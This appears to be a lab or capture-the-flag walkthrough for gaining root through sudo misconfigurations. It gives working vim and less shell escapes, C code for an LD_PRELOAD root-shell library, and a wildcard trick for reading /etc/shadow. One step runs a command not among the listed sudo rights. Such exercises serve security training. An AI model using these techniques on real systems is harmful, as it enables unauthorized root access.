# Scenario 20 — Sudo misconfig privesc (NOPASSWD + env_keep)

**Difficulty:** 🟡 | **Time:** ~15 min | **Domains:** 06, 13
**Tools:** shell, [GTFOBins](../../tools/metasploit.md)

## Story
You have a shell as `svcuser` on 10.10.10.20. Escalate via a sudoers misconfiguration to read `/root/flag.txt`.

## Step 1 — Enumerate sudo rights
```bash
sudo -l
```
**Expected finding:**
```
(root) NOPASSWD: /usr/bin/less /var/log/*
(root) NOPASSWD: /usr/bin/vim
env_keep += "LD_PRELOAD"
```

## Step 2 — Exploit NOPASSWD vim
```bash
sudo vim -c ':!/bin/sh'
```
**Expected finding:** root shell (vim spawns via `:!`).

## Step 3 — Exploit NOPASSWD less
**What we're doing:** Less shells out to `!cmd` by default.
```bash
sudo less /var/log/syslog
# inside less:
!/bin/sh
```

## Step 4 — Exploit env_keep LD_PRELOAD
**What we're doing:** Inject a library into any sudo-run command.
```bash
cat > /tmp/x.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/sh -p"); }
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c
sudo LD_PRELOAD=/tmp/x.so /usr/bin/true  # any allowed cmd
```
**Expected finding:** root shell.

## Step 5 — Read the flag
```bash
cat /root/flag.txt
```

## Step 6 — Final answer
**Answer format:** flag string.

## Gotchas across this chain
- `sudo -l` may require the user's password even for listing — try without password first.
- Wildcards in sudoers (`/usr/bin/less /var/log/*`) are dangerous: you can pass `/var/log/../etc/shadow`.
- `env_keep` only helps if at least one sudo command is allowed (even `/bin/true`).
- On newer sudo (1.9.13+), LD_PRELOAD is stripped regardless — check `sudo -V`.

## Variant questions this scenario teaches
- "What sudo privilege does user svcuser have?"
- "Which GTFOBins technique works against the allowed binary?"
- "What is CVE-2019-14287?" (sudo -u#-1 bypass)

